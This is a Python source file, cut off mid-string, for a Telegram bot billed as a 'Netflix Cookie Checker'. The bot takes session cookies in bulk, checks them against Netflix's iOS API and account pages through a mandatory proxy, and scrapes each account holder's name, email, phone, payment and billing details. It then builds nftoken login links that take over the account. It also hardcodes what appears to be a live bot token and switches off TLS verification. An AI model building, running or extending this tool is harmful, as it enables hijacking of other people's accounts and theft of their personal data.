import os
import asyncio
import logging
import re
from typing import Dict, Optional, Tuple, Set
import time
from threading import Thread
import sys
import json
import codecs
import requests
import html
import zipfile
import tempfile
import shutil
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7VQdjV3o")[cite: 3]
PORT = int(os.environ.get("PORT", 8000))[cite: 3]

# SET YOUR TELEGRAM USER ID HERE (Owner Has Permanent Access)
OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))[cite: 3]

# Set to store approved User IDs (Owner is automatically added)
APPROVED_USERS: Set[int] = {OWNER_ID}[cite: 3]

# Global proxy state and bulk cancel event
CURRENT_PROXY: Optional[str] = None[cite: 3]
cancel_bulk_event = asyncio.Event()[cite: 3]

# ========== ACCESS CONTROL HELPER ==========
def is_approved(user_id: int) -> bool:
    return user_id in APPROVED_USERS or user_id == OWNER_ID[cite: 3]

# ========== FLASK APP & HEALTH ENDPOINTS ==========
app = Flask(__name__)[cite: 3]

@app.route("/", methods=["GET"])
def index():
    bot_status = "🟢 Running" if application else "🔴 Stopped"[cite: 3]
    proxy_status = CURRENT_PROXY if CURRENT_PROXY else "❌ Not Set (Required)"[cite: 3]
    return f"""
    <html>
        <head>
            <title>Netflix Cookie Checker Bot</title>
            <style>
                body {{ font-family: Arial; margin: 40px; background-color: #f5f5f5; }}
                .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .status {{ padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .running {{ background-color: #d4edda; color: #155724; }}
                .stopped {{ background-color: #f8d7da; color: #721c24; }}
                h1 {{ color: #333; }}
                a {{ color: #007bff; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ Netflix Cookie Checker Bot</h1>
                <div class="status {'running' if application else 'stopped'}">
                    <p><b>Bot Status:</b> {bot_status}</p>
                    <p><b>BOT_TOKEN:</b> {'✅ Set' if BOT_TOKEN else '❌ Not Set'}</p>
                    <p><b>Approved Users Count:</b> {len(APPROVED_USERS)}</p>
                    <p><b>Active Proxy:</b> {proxy_status}</p>
                    <p><b>BOT_link: <a href="https://t.me/Cook2linkbot">Redirect</a></b></p>
                    <p><b>Port:</b> {PORT}</p>
                </div>
                <hr>
                <p><a href="/health">Check Health</a></p>
            </div>
        </body>
    </html>
    """, 200[cite: 3]

@app.route("/health", methods=["GET"])
def health():
    return {
        "status": "healthy" if application else "unhealthy",
        "bot_running": application is not None,
        "bot_token_set": bool(BOT_TOKEN),
        "approved_users_count": len(APPROVED_USERS),
        "proxy_set": bool(CURRENT_PROXY),
        "current_proxy": CURRENT_PROXY,
        "timestamp": time.time()
    }, 200 if application else 503[cite: 3]

# ========== LOGGING SETUP ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)[cite: 3]
logger = logging.getLogger(__name__)[cite: 3]

application = None[cite: 3]

# ========== MESSAGES & TEXT ==========
START_TEXT = (
    "👋 Netflix Cookie Checker Bot\n\n"
    "⚠️ IMPORTANT: You MUST set a proxy using /addproxy before checking any cookies.\n\n"
    "Available Commands:\n"
    "• /addproxy `<proxy>` — Add & test an HTTP proxy (REQUIRED)\n"
    "  Supported formats:\n"
    "  - `host:port` or `http://host:port`\n"
    "  - `user:pass@host:port` or `http://user:pass@host:port`\n"
    "  - `user:pass:host:port` or `http://user:pass:host:port`\n"
    "• /stop — Halt an ongoing bulk check immediately\n"
    "• /help — Usage instructions\n\n"
    "Owner Commands:\n"
    "• /approve `<userid>` — Grant access to a user\n"
    "• /disapprove `<userid>` — Revoke access from a user\n"
    "• /approved — View list of approved users\n\n"
    " Bot by @zyokr 🦖"
)[cite: 3]

HELP_TEXT = (
    "How to use:\n"
    "1. Access is restricted. Ask owner for approval.\n"
    "2. MANDATORY: Set a working proxy using `/addproxy` before checking.\n"
    "   Proxy Formats Supported:\n"
    "   • host:port\n"
    "   • user:pass@host:port\n"
    "   • user:pass:host:port\n"
    "3. Paste cookies as text, upload a `.txt` file, or upload a `.zip` archive.\n"
    "4. Use `/stop` anytime to halt bulk processing."
)[cite: 3]

COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)[cite: 3]


# ========== HELPER FUNCTIONS FOR PROXY & PARSING ==========
def _format_proxy_string(raw_proxy: str) -> str:
    proxy = raw_proxy.strip()[cite: 3]
    scheme = "http://"[cite: 3]
    if proxy.startswith("http://"):
        proxy = proxy[7:][cite: 3]
    elif proxy.startswith("https://"):
        scheme = "https://"[cite: 3]
        proxy = proxy[8:][cite: 3]

    parts = proxy.split(":")[cite: 3]
    if len(parts) == 4:
        user, password, host, port = parts[cite: 3]
        return f"{scheme}{user}:{password}@{host}:{port}"[cite: 3]
    
    return f"{scheme}{proxy}"[cite: 3]

def _get_request_proxies() -> Optional[Dict[str, str]]:
    if CURRENT_PROXY:
        return {"http": CURRENT_PROXY, "https": CURRENT_PROXY}[cite: 3]
    return None[cite: 3]

def _is_proxy_live(proxy_str: str) -> Tuple[bool, str]:
    proxies = {"http": proxy_str, "https": proxy_str}[cite: 3]
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=6, verify=False)[cite: 3]
        if r.status_code == 200:
            ip = r.json().get("origin", "Unknown IP")[cite: 3]
            return True, f"Live! Outbound IP: `{ip}`"[cite: 3]
        return False, f"Failed with status code {r.status_code}"[cite: 3]
    except Exception as e:
        return False, str(e)[cite: 3]

def _is_json_cookie(text: str) -> bool:
    text = text.strip()[cite: 3]
    if not (text.startswith('[') and text.endswith(']')):
        return False[cite: 3]
    try:
        json.loads(text)[cite: 3]
        return True[cite: 3]
    except Exception:
        return False[cite: 3]

def _is_netscape_cookie(text: str) -> bool:
    lines = text.strip().split('\n')[cite: 3]
    if len(lines) < 1:
        return False[cite: 3]
    
    for line in lines:
        line = line.strip()[cite: 3]
        if not line or line.startswith('#'):
            continue
     
        if '\t' in line:
            parts = line.split('\t')[cite: 3]
            if len(parts) >= 7:
                return True[cite: 3]
        else:
            parts = line.split()[cite: 3]
            if len(parts) >= 7:
                domain = parts[0][cite: 3]
                flag = parts[1][cite: 3]
                path = parts[2][cite: 3]
                secure = parts[3][cite: 3]
                try:
                    _ = int(parts[4])[cite: 3]
                    if domain.startswith('.') and flag in ['TRUE', 'FALSE'] and path == '/' and secure in ['TRUE', 'FALSE']:
                        return True[cite: 3]
                except (ValueError, IndexError):
                    continue[cite: 3]
    return False[cite: 3]

def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()[cite: 3]
    return t.startswith("cookie:") or (";" in text and "=" in text)[cite: 3]

def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    try:
        cookies_array = json.loads(json_str)[cite: 3]
        kv: Dict[str, str] = {}[cite: 3]
        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name = cookie_obj.get('name', '')[cite: 3]
                    value = cookie_obj.get('value', '')[cite: 3]
                    if name and value:
                        kv[name] = value[cite: 3]
        return kv[cite: 3]
    except Exception as e:
        logger.error(f"Error parsing JSON cookies: {e}")[cite: 3]
        return {}[cite: 3]

def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    kv: Dict[str, str] = {}[cite: 3]
    lines = netscape_str.strip().split('\n')[cite: 3]
    
    for line in lines:
        line = line.strip()[cite: 3]
        if not line or line.startswith('#'):
            continue[cite: 3]
        
        delimiter = '\t' if '\t' in line else ' '[cite: 3]
        parts = line.split(delimiter)[cite: 3]
        
        if len(parts) >= 7:
            try:
                name = parts[5][cite: 3]
                if delimiter == '\t':
                    value = parts[6][cite: 3]
                else:
                    match = re.match(r'^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$', line)[cite: 3]
                    value = match.group(7).strip() if match else ' '.join(parts[6:])[cite: 3]
                
                if name and value:
                    kv[name] = value[cite: 3]
            except Exception:
                continue[cite: 3]
    return kv[cite: 3]

def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()[cite: 3]
    parts = [p.strip() for p in cleaned.split(";") if p.strip()][cite: 3]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()][cite: 3]

    kv: Dict[str, str] = {}[cite: 3]
    for part in parts:
        m = COOKIE_KV_RE.match(part)[cite: 3]
        if m:
            kv[m.group(1).strip()] = m.group(2).strip()[cite: 3]
    return kv[cite: 3]

def _build_cookie_header(cookie_input: str) -> Optional[str]:
    if _is_json_cookie(cookie_input):
        kv = _extract_json_cookies(cookie_input)[cite: 3]
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])[cite: 3]
    
    if _is_netscape_cookie(cookie_input):
        kv = _extract_netscape_cookies(cookie_input)[cite: 3]
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])[cite: 3]
    
    if _looks_like_cookie_header(cookie_input):
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()[cite: 3]
        if "=" not in cleaned:
            return None[cite: 3]
        kv = _extract_cookie_kv_pairs(cookie_input)[cite: 3]
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])[cite: 3]
        return cleaned[cite: 3]

    kv = _extract_cookie_kv_pairs(cookie_input)[cite: 3]
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])[cite: 3]
    return None[cite: 3]

def _split_multiple_cookies(text: str) -> list[str]:
    text = text.strip()[cite: 3]
    if _is_json_cookie(text):
        return [text][cite: 3]
    
    blocks = re.split(r'\n\s*\n', text)[cite: 3]
    cookie_list = [][cite: 3]
    
    for block in blocks:
        block = block.strip()[cite: 3]
        if not block:
            continue[cite: 3]
        lines = block.splitlines()[cite: 3]
        if any("netflixid" in line.lower() for line in lines):
            cookie_list.append(block)[cite: 3]
        else:
            for line in lines:
                line = line.strip()[cite: 3]
                if "netflixid" in line.lower():
                    cookie_list.append(line)[cite: 3]
                    
    return cookie_list if cookie_list else [text][cite: 3]

def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = [][cite: 3]
    for token in cookie_header.split(";"):
        token = token.strip()[cite: 3]
        if "=" in token:
            names.append(token.split("=", 1)[0].strip())[cite: 3]
    names = [n for n in names if n][cite: 3]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")[cite: 3]


# ========== NETFLIX API & VERIFICATION ==========
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"[cite: 3]
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}[cite: 3]

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}[cite: 3]

def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()[cite: 3]
        if not token or "=" not in token:
            continue[cite: 3]
        k, v = token.split("=", 1)[cite: 3]
        if k.strip().lower() == "netflixid":
            return v.strip()[cite: 3]
    return None[cite: 3]

def _generate_nftoken(cookie_header: str, timeout_s: int = 8) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)[cite: 3]
    if not netflix_id:
        return False, "Invalid or expired cookie. NetflixId not found.", None[cite: 3]

    headers = dict(NFTOKEN_HEADERS)[cite: 3]
    headers["Cookie"] = f"NetflixId={netflix_id}"[cite: 3]

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            proxies=_get_request_proxies(),
            timeout=timeout_s,
            verify=False,
        )[cite: 3]
        r.raise_for_status()[cite: 3]
        data = r.json()[cite: 3]

        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})[cite: 3]
        nftoken = td.get("token")[cite: 3]

        if not nftoken:
            return False, "Invalid or expired cookie. Token generation failed.", None[cite: 3]

        return True, "Token API returned a valid nftoken.", nftoken[cite: 3]
    except Exception as e:
        logger.error(f"Error generating nftoken: {e}")[cite: 3]
        return False, "Invalid or expired cookie.", None[cite: 3]

def decode_text(value):
    if value is None:
        return "Unknown"[cite: 3]
    value = str(value)[cite: 3]
    try:
        value = codecs.decode(value, "unicode_escape")[cite: 3]
    except Exception:
        pass[cite: 3]
    value = html.unescape(value)[cite: 3]
    value = re.sub(
        r'\\x([0-9A-Fa-f]{2})',
        lambda m: bytes.fromhex(m.group(1)).decode('latin1'),
        value
    )[cite: 3]
    return value.strip()[cite: 3]

def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, str]:
    cookie_dict: Dict[str, str] = {}[cite: 3]
    for token in cookie_header.split(";"):
        token = token.strip()[cite: 3]
        if not token or "=" not in token:
            continue[cite: 3]
        k, v = token.split("=", 1)[cite: 3]
        cookie_dict[k.strip()] = v.strip()[cite: 3]

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId found in cookies"}[cite: 3]

    session = requests.Session()[cite: 3]
    session.cookies.update(cookie_dict)[cite: 3]
    
    # Enforce English language cookies
    session.cookies.set("nf_lang", "en", domain=".netflix.com")[cite: 3]
    session.cookies.set("cl_lang", "en-US", domain=".netflix.com")[cite: 3]
    
    if CURRENT_PROXY:
        session.proxies.update(_get_request_proxies())[cite: 3]

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "X-Netflix.Context.Locales": "en-US",
    }[cite: 3]

    urls = [
        "https://www.netflix.com/YourAccount?locale=en-US",
        "https://www.netflix.com/account?locale=en-US",
        "https://www.netflix.com/account/membership?locale=en-US",
    ][cite: 3]

    try:
        resp = None[cite: 3]
        txt = ""[cite: 3]
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)[cite: 3]
                if r.status_code == 200 and ("Account" in (r.text or "") or "YourAccount" in r.url or "cuenta" in (r.text or "").lower()):
                    resp = r[cite: 3]
                    txt = r.text or ""[cite: 3]
                    break[cite: 3]
            except Exception:
                continue[cite: 3]

        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}[cite: 3]

        if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
            return {"ok": False, "reason": "Redirected to login"}[cite: 3]

        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)[cite: 3]
            return decode_text(m.group(1)) if m else None[cite: 3]

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')[cite: 3]
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')[cite: 3]
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )[cite: 3]
        email = (
            find(r'"emailAddress"\s*:\s*"([^"]+)"')
            or find(r'"email"\s*:\s*"([^"]+)"')
            or find(r'"loginId"\s*:\s*"([^"]+)"')
        )[cite: 3]
        member_since = find(r'"memberSince":"([^"]+)"')[cite: 3]
        next_billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        )[cite: 3]
        plan_price = (
            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        )[cite: 3]
        payment = (
            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        )[cite: 3]
        phone = (
            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        )[cite: 3]
        quality = (
            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        )[cite: 3]
        streams = (
            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        )[cite: 3]

        # Check explicit payment issue text in English + Spanish
        has_payment_issue_text = bool(re.search(
            r"(?i)("
            r"fix\s+your\s+payment|"
            r"didn['’]t\s+go\s+through|"
            r"can['’]t\s+process\s+your\s+payment|"
            r"retry\s+payment|"
            r"update\s+payment|"
            r"no\s+pudimos\s+procesar|"
            r"no\s+podemos\s+procesar|"
            r"actualiza\s+la\s+informaci[óo]n\s+de\s+pago|"
            r"actualizar\s+forma\s+de\s+pago|"
            r"actualizar\s+m[ée]todo\s+de\s+pago"
            r")",
            txt
        ))[cite: 3]

        payment_status_raw = find(r'"paymentStatus"\s*:\s*"([^"]+)"')[cite: 3]
        membership_status_raw = find(r'"membershipStatus"\s*:\s*"([^"]+)"') or "CURRENT_MEMBER"[cite: 3]
        account_status_raw = find(r'"accountStatus"\s*:\s*"([^"]+)"')[cite: 3]
        is_hold_json = bool(re.search(r'"(isPaymentProblem|isHold)"\s*:\s*true', txt, re.I))[cite: 3]

        if has_payment_issue_text or is_hold_json or account_status_raw in ["HOLD", "NEEDS_PAYMENT"]:
            payment_status = "Action Required (Payment Failed)"[cite: 3]
        elif payment_status_raw:
            payment_status = payment_status_raw[cite: 3]
        elif membership_status_raw == "CURRENT_MEMBER":
            payment_status = "Active / Paid"[cite: 3]
        else:
            payment_status = membership_status_raw[cite: 3]

        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No"[cite: 3]
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"[cite: 3]

        profiles: list = [][cite: 3]
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles?locale=en-US", timeout=6, verify=False)[cite: 3]
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")[cite: 3]
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")[cite: 3]
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")[cite: 3]
        except Exception:
            pass[cite: 3]

        profiles_str = (
            ", ".join(decode_text(p) for p in profiles)
            if profiles else (name or "Unknown")
        )[cite: 3]

        return {
            "ok": True,
            "name": name or "Unknown",
            "email": email or "Unknown",
            "country": country or "Unknown",
            "plan": plan_raw or "Unknown",
            "plan_price": plan_price or "N/A",
            "member_since": member_since or "Unknown",
            "next_billing": next_billing or "Unknown",
            "payment_method": payment or "CC",
            "phone": phone or "N/A",
            "has_phone": "Yes" if phone else "No",
            "video_quality": quality or "HD",
            "max_streams": streams or "2",
            "payment_status": payment_status,
            "extra_member": extra,
            "email_verified": email_ver,
            "membership_status": membership_status_raw,
            "profiles": profiles_str,
            "connected_profiles": str(len(profiles)) if profiles else "1"
        }[cite: 3]
    except Exception as e:
        logger.error(f"Error checking netflix cookie: {e}")[cite: 3]
        return {"ok": False, "reason": str(e)}[cite: 3]


# ========== OWNER APPROVAL SYSTEM COMMANDS ==========
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the bot owner can approve users.")[cite: 3]
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/approve <user_id>`", parse_mode="Markdown")[cite: 3]
        return

    try:
        target_id = int(context.args[0].strip())[cite: 3]
        APPROVED_USERS.add(target_id)[cite: 3]
        await update.message.reply_text(f"✅ User `{target_id}` has been approved to use the bot!", parse_mode="Markdown")[cite: 3]
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID. Please provide a numeric Telegram ID.")[cite: 3]

async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the bot owner can disapprove users.")[cite: 3]
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/disapprove <user_id>`", parse_mode="Markdown")[cite: 3]
        return

    try:
        target_id = int(context.args[0].strip())[cite: 3]
        if target_id == OWNER_ID:
            await update.message.reply_text("❌ You cannot disapprove the Owner!")[cite: 3]
            return
        
        if target_id in APPROVED_USERS:
            APPROVED_USERS.remove(target_id)[cite: 3]
            await update.message.reply_text(f"🚫 User `{target_id}` has been removed from approved users.", parse_mode="Markdown")[cite: 3]
        else:
            await update.message.reply_text("⚠️ User ID is not currently in the approved list.")[cite: 3]
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID.")[cite: 3]

async def approved_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the bot owner can view approved users.")[cite: 3]
        return

    users_text = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])[cite: 3]
    await update.message.reply_text(f"👥 Approved Users List:\n\n{users_text}", parse_mode="Markdown")[cite: 3]


# ========== TELEGRAM HANDLER FUNCTIONS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nAsk the owner to approve your access.", parse_mode="Markdown")[cite: 3]
        return

    try:
        logger.info(f"📱 /start from {user_id}")[cite: 3]
        await update.message.reply_text(START_TEXT, parse_mode="Markdown")[cite: 3]
    except Exception as e:
        logger.error(f"Error in start: {e}")[cite: 3]

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Ask the owner to approve User ID: `{user_id}`", parse_mode="Markdown")[cite: 3]
        return

    try:
        logger.info(f"❓ /help from {user_id}")[cite: 3]
        await update.message.reply_text(HELP_TEXT)[cite: 3]
    except Exception as e:
        logger.error(f"Error in help: {e}")[cite: 3]

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Ask owner for approval. Your ID: `{user_id}`", parse_mode="Markdown")[cite: 3]
        return

    global CURRENT_PROXY[cite: 3]
    if not context.args:
        await update.message.reply_text(
            "⚠️ Please provide a proxy string.\n\n"
            "Supported Formats:\n"
            "• `/addproxy host:port`\n"
            "• `/addproxy user:pass@host:port`\n"
            "• `/addproxy user:pass:host:port`",
            parse_mode="Markdown"
        )[cite: 3]
        return

    raw_proxy = context.args[0].strip()[cite: 3]
    formatted_proxy = _format_proxy_string(raw_proxy)[cite: 3]

    msg = await update.message.reply_text("🔄 Testing proxy connection...", parse_mode="Markdown")[cite: 3]
    
    loop = asyncio.get_running_loop()[cite: 3]
    is_live, status_detail = await loop.run_in_executor(None, _is_proxy_live, formatted_proxy)[cite: 3]

    if is_live:
        CURRENT_PROXY = formatted_proxy[cite: 3]
        await msg.edit_text(
            f"✅ Proxy Added Successfully!\n\n"
            f"• Proxy: `{formatted_proxy}`\n"
            f"• Status: {status_detail}",
            parse_mode="Markdown"
        )[cite: 3]
    else:
        await msg.edit_text(
            f"❌ Proxy Validation Failed!\n\n"
            f"• Error: {status_detail}\n"
            f"The proxy was not added.",
            parse_mode="Markdown"
        )[cite: 3]

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id[cite: 3]
    if not is_approved(user_id):
        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")[cite: 3]
        return

    cancel_bulk_event.set()[cite: 3]
    await update.message.reply_text("🛑 **Stop signal set!** The bulk check will halt on the next iteration.")[cite: 3]

async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message or not update.message.text:
            return

        cookie_input = update.message.text.strip()
        
        # 1. Silently ignore normal group conversation text
        cookie_header = _build_cookie_header(cookie_input)
        if not cookie_header:
            return

        # 2. Enforce access approval only when actual cookie is pasted
        user_id = update.effective_user.id
        if not is_approved(user_id):
            await update.message.reply_text(
                f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact the owner to grant you access.", 
                parse_mode="Markdown"
            )
            return

        # 3. Proxy requirement check
        if not CURRENT_PROXY:
            await update.message.reply_text(
                "⚠️ **Proxy Required!**\n\n"
                "You must set a live proxy before checking cookies.\n"
                "Use `/addproxy` to set one.",
                parse_mode="Markdown"
            )
            return

        logger.info(f"📨 Cookie check request from {user_id}: {len(cookie_input)} chars")
        preview = _safe_preview_cookie_keys(cookie_header)
        msg = await update.message.reply_text(f"🔎 Checking Netflix cookies...\n(Keys: {preview})")

        loop = asyncio.get_running_loop()
        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

        if ok and nftoken:
            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)

            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"

            formatted_text = (
                "📁 Source:\n"
                "pasted_cookie.txt\n"
                "✅ Status: Valid Premium Account\n\n"
                "👤 Account Details:\n"
                f"• Name: {acct.get('name', 'Unknown')}\n"
                f"• Email: {acct.get('email', 'Unknown')}\n"
                f"• Country: {acct.get('country', 'Unknown')}\n"
                f"• Plan: {acct.get('plan', 'Unknown')}\n"
                f"• Price: {acct.get('plan_price', 'N/A')}\n"
                f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
                f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
                f"• Payment: {acct.get('payment_method', 'CC')}\n"
                f"• Payment Status: {acct.get('payment_status', 'Active / Paid')}\n"
                f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
